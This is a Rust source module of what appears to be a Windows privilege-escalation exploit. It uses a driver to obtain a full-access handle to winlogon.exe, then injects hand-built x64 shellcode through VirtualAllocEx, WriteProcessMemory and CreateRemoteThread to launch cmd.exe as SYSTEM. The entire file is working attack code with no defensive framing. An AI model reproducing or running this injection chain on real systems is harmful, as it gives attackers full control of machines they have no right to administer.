use windows::{
    core::s,
    Win32::{
        Foundation::CloseHandle,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
            Threading::{CreateRemoteThread, WaitForSingleObject},
        },
    },
};

use crate::proc;

fn build_winexec_shellcode(winexec_addr: u64) -> Vec<u8> {
    let mut sc: Vec<u8> = Vec::with_capacity(41);
    sc.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0x8D, 0x0D, 0x16, 0x00, 0x00, 0x00,
        0xBA, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8,
    ]);
    sc.extend_from_slice(&winexec_addr.to_le_bytes());
    sc.extend_from_slice(&[
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3,
    ]);
    sc.extend_from_slice(b"cmd.exe\0");
    sc
}

pub fn run(device: &str) -> Result<(), String> {
    const SOURCE_NAME: &str = "winlogon.exe";
    let source_pid = proc::find_pid(SOURCE_NAME)?;
    println!("[+] Source PID ............ {source_pid} ({SOURCE_NAME})");
    println!("[+] Payload ............... WinExec(\"cmd.exe\", SW_SHOW)");

    let driver = crate::open_driver(device)?;

    let proc_handle = driver.open_process(source_pid)
        .map_err(|e| format!("cmd 785 against {SOURCE_NAME} (pid {source_pid}): {e}"))?;
    println!(
        "[+] Source handle ......... 0x{:X} (kernel-minted PROCESS_ALL_ACCESS)",
        proc_handle.0 as u64,
    );

    let winexec_addr: u64 = unsafe {
        let k32 = GetModuleHandleA(s!("kernel32.dll"))
            .map_err(|e| format!("GetModuleHandleA(kernel32): {e}"))?;
        let p = GetProcAddress(k32, s!("WinExec"))
            .ok_or_else(|| "GetProcAddress(WinExec) returned NULL".to_string())?;
        p as usize as u64
    };
    println!("[+] WinExec resolved ...... 0x{:016X}", winexec_addr);

    let shellcode = build_winexec_shellcode(winexec_addr);
    println!("[+] Shellcode built ....... {} bytes", shellcode.len());

    let remote_buf = unsafe {
        VirtualAllocEx(
            proc_handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if remote_buf.is_null() {
        unsafe { let _ = CloseHandle(proc_handle); }
        return Err("VirtualAllocEx returned NULL".into());
    }
    println!("[+] Remote alloc .......... 0x{:016X} (RWX, {} bytes)", remote_buf as u64, shellcode.len());

    let mut written: usize = 0;
    unsafe {
        WriteProcessMemory(
            proc_handle,
            remote_buf,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut written),
        ).map_err(|e| format!("WriteProcessMemory: {e}"))?;
    }
    println!("[+] Wrote shellcode ....... {written} bytes");

    let thread_handle = unsafe {
        CreateRemoteThread(
            proc_handle,
            None,
            0,
            Some(std::mem::transmute(remote_buf)),
            None,
            0,
            None,
        ).map_err(|e| format!("CreateRemoteThread: {e}"))?
    };
    println!("[+] Remote thread spawned . handle 0x{:X}", thread_handle.0 as u64);

    unsafe { let _ = WaitForSingleObject(thread_handle, 5000); }
    println!("[+] Thread joined. cmd.exe should now be running as SYSTEM (child of winlogon.exe).");

    unsafe {
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(proc_handle);
    }
    Ok(())
}
